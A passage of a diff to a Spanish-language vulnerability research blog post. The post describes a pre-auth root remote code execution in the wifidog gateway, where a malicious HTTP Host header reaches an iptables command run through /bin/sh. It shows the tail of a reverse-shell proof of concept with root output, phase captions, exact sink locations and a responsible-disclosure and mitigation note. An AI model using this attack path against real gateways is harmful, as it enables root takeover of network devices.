+Connection received ... <span class="syn-c"># reverse shell como root</span>
+# id
+<span class="syn-s">uid=0(root)</span> <span class="syn-c"># RCE ROOT verificado</span></code></pre></div>
+<figure class="figure">
+  <img src="img/wifidog-phase2-listener.png" alt="Fase 2: listener y preparación del authclient" loading="lazy">
+  <figcaption class="figcap">Fase 2 — Preparación del entorno y listener del atacante.</figcaption>
+</figure>
+<figure class="figure">
+  <img src="img/wifidog-phase3-injection.png" alt="Fase 3: el header Host inyectado en la petición" loading="lazy">
+  <figcaption class="figcap">Fase 3 — La petición con el header Host malicioso hacia el puerto 2060.</figcaption>
+</figure>
+<figure class="figure">
+  <img src="img/wifidog-phase4-exploit.png" alt="Fase 4: ejecución en el host vía iptables" loading="lazy">
+  <figcaption class="figcap">Fase 4 — Ejecución en el host: la cadena iptables se construye con el host inyectado.</figcaption>
+</figure>
+<figure class="figure">
+  <img src="img/wifidog-phase5-root-shell.png" alt="Fase 5: reverse shell como root" loading="lazy">
+  <figcaption class="figcap">Fase 5 — Reverse shell recibida como uid=0 (root). RCE verificada.</figcaption>
+</figure>
 
-        <h2 class="section-title mono" id="w05"><span style="color: var(--text-muted);">05.</span> 0x04 — Requisito de Configuración</h2>
-        <p>
-            El camino <span class="mono">fw_allow_host</span> → <span class="mono">iptables -d</span> solo se recorre cuando existe al menos un <span class="mono">FirewallRuleSet</span> global definido en la config con una regla que use el host permitido. En la configuración por defecto pura de wifidog, esa sección puede estar vacía, lo que impide alcanzar el sink. En despliegues reales (OpenWrt, redes municipales, gateways de pago) suele definirse para autorizar hosts, lo que hace el sink alcanzable.
-        </p>
-        <div class="callout-warning">
-            <div class="callout-title mono">Divulgación responsable y mitigación</div>
-            <p>El fix correcto en el mantenedor es validar/escapar el valor del host antes de interpolarlo en un comando (nunca pasar datos de red a un shell), o construir las reglas iptables mediante un ejecutor que no use <span class="mono">sh -c</span>. Se aplica de forma directa a cualquier componente que derive comandos de firewall/parsing a partir de cabeceras HTTP. Comunicado al mantenedor como parte del proceso responsable.</p>
-        </div>
-
-        <h2 class="section-title mono" id="w06"><span style="color: var(--text-muted);">06.</span> 0x05 — Referencias</h2>
-        <div class="table-wrapper">
-            <table>
-                <thead><tr><th>Referencia</th><th>Descripción</th></tr></thead>
-                <tbody>
-                    <tr><td class="mono">wifidog/wifidog-gateway</td><td>Repositorio del gateway wifidog</td></tr>
-                    <tr><td class="mono">libhttpd/api.c:462</td><td>Extracción de la cabecera Host</td></tr>
-                    <tr><td class="mono">http.c:140/154</td><td>Dispatch del request, whitelist 404</td></tr>
-                    <tr><td class="mono">fw_iptables.c:596</td><td>Sink: sprintf de la regla iptables con el host</td></tr>
-                    <tr><td class="mono">util.c:96</td><td>execvp(/bin/sh,-c)</td></tr>
-                    <tr><td class="mono">CWE-78</td><td>Improper Neutralization in OS Command</td></tr>
-                </tbody>
-            </table>
-        </div>
-
-        <p style="margin-top:2rem;">
-            <a href="caza-autonoma-e2e-serie.html" class="mono" style="font-size:0.85rem; color:var(--accent-blue);">← Volver al índice de la serie</a>
-        </p>
-    </article>
-
-    <footer class="footer">
-        <div class="footer-content">
-            <div class="social-links mono">
-                <a href="https://github.com/tty503" target="_blank" rel="noopener noreferrer">github/tty503</a>
-                <a href="https://linkedin.com/in/tty503" target="_blank" rel="noopener noreferrer">linkedin/tty503</a>
-                <a href="https://x.com/tty_503" target="_blank" rel="noopener noreferrer">x/tty_503</a>
-                <a href="https://tty503.com">tty503.com</a>
-            </div>
-            <p class="copyright">© <span id="current-year"></span> Christian Márquez. Vulnerability Research — wifidog Host header RCE.</p>
-        </div>
-    </footer>
-
-    <script>
-        document.getElementById('current-year').textContent = new Date().getFullYear();
-        const navbar = document.querySelector('.navbar');
-        window.addEventListener('scroll', () => {
-            if (window.scrollY > 50) { navbar.style.background = 'rgba(3, 3, 3, 0.9)'; }
-            else { navbar.style.background = 'rgba(3, 3, 3, 0.75)'; }
-        });
-    </script>
-
-    <script type="application/ld+json">
+<h2 id="w05"><span class="idx">06.</span> 0x04 — Requisito de configuración y mitigación</h2>
+<p>El camino <code>fw_allow_host</code> → <code>iptables -d</code> solo se recorre cuando existe al menos un <code>FirewallRuleSet</code> global definido en la config con una regla que use el host permitido. En la configuración por defecto pura de wifidog, esa sección puede estar vacía, lo que impide alcanzar el sink. En despliegues reales (OpenWrt, redes municipales, gateways de pago) suele definirse para autorizar hosts, lo que hace el sink alcanzable.</p>
+<div class="callout callout-warn"><span class="ico">⚠</span><div>
+  <div class="h">Divulgación responsable y mitigación</div>
+  <p>El fix correcto es validar/escapar el valor del host antes de interpolarlo en un comando — nunca pasar datos de red a un shell — o ejecutar las reglas iptables sin <code>sh -c</code>. Aplica a cualquier componente que derive comandos de firewall a partir de cabeceras HTTP. Comunicado al mantenedor como parte del proceso responsable.</p>
+</div></div>
+</article>
+<section class="related"><h2>Sigue leyendo</h2><div class="grid grid-2"><a class="card" href="coovachilli-eap-identity-rce.html"><span class="arrow">→</span><div class="meta"><span>2026-09-02</span><span>18 min</span></div><div class="t">CoovaChilli RCE pre-auth: EAP-Identity → conup (CWE-78)</div><div class="d">Payload en EAP-Response/Identity pre-auth viaja sin saneado por la cadena EAP→RADIUS→env→script y termina en un eval. RC</div><span class="badge badge-rce">Vulnerability Research</span></a><a class="card" href="libuhttpd-date2unix-stackoverflow.html"><span class="arrow">→</span><div class="meta"><span>2026-09-02</span><span>16 min</span></div><div class="t">libuhttpd: stack overflow en date2unix (CWE-121)</div><div class="d">Un If-Modified-Since de 220 bytes desborda buf[128] y toma control parcial del RIP con un decoder XOR in-stack. Disparid</div><span class="badge badge-rce">Vulnerability Research</span></a><a class="card" href="autopsia-librtmp-minihttpd.html"><span class="arrow">→</span><div class="meta"><span>2026-09-02</span><span>12 min</span></div><div class="t">librtmp AMF3 + mini_httpd htpasswd: primitivas reales sin cadena a RCE</div><div class="d">OOB read en el decoder AMF3 de librtmp y command injection en htpasswd de mini_httpd. Cuándo una primitiva real no llega</div><span class="badge badge-infra">Vulnerability Research</span></a></div></section>
+</main>
+<footer class="site-footer"><div class="footer-inner">
+<div class="social"><a href="https://github.com/tty503" target="_blank" rel="noopener noreferrer">GitHub</a><a href="https://linkedin.com/in/tty503" target="_blank" rel="noopener noreferrer">LinkedIn</a><a href="https://x.com/tty_503" target="_blank" rel="noopener noreferrer">X / Twitter</a><a href="https://tty503.com/sitemap.xml" target="_blank" rel="noopener noreferrer">RSS</a></div>
+<p class="footer-note">© <span data-year></span> Christian Márquez · Threat Intelligence · Ingeniería Inversa · Exploit Development · Seguridad OT. Venezuela.</p>
+</div></footer>
+<button class="to-top" aria-label="Volver arriba">↑</button>
+<script src="assets/js/main.js"></script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
     {
-      "@context": "https://schema.org",
       "@type": "Article",
-      "headline": "wifidog: RCE root via cabecera Host (CWE-78)",
-      "description": "Un único request HTTP pre-auth con cabecera Host maliciosa termina en execvp(/bin/sh,-c) que construye una regla iptables. RCE root con reverse shell. Análisis línea a línea y validación E2E.",
+      "headline": "wifidog RCE root: cabecera Host \u2192 iptables (CWE-78)",
+      "description": "Request HTTP pre-auth con cabecera Host maliciosa termina en execvp(/bin/sh, -c) que construye iptables. Reverse shell root verificada. Sink fw_iptables.c:596 \u2192 util.c:96.",
       "author": { "@type": "Person", "name": "Christian Márquez", "url": "https://tty503.com" },
+      "publisher": { "@type": "Organization", "name": "tty503" },
       "datePublished": "2026-09-02",
       "dateModified": "2026-09-02",
       "mainEntityOfPage": "https://tty503.com/wifidog-host-header-rce.html",
-      "inLanguage": "es"
+      "inLanguage": "es",
+      "keywords": "CWE-78, RCE root, iptables, Reverse shell"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [{"@type": "ListItem", "position": 1, "item": {"@id": "https://tty503.com/index.html", "name": "tty503"}}, {"@type": "ListItem", "position": 2, "item": {"@id": "https://tty503.com/caza-autonoma-e2e-serie.html", "name": "Serie"}}, {"@type": "ListItem", "position": 3, "item": {"@id": "https://tty503.com/wifidog-host-header-rce.html", "name": "wifidog RCE root: cabecera Host → iptables (CWE-78)"}}]
     }
-    </script>
+  ]
+}
+</script>
 </body>
 </html>
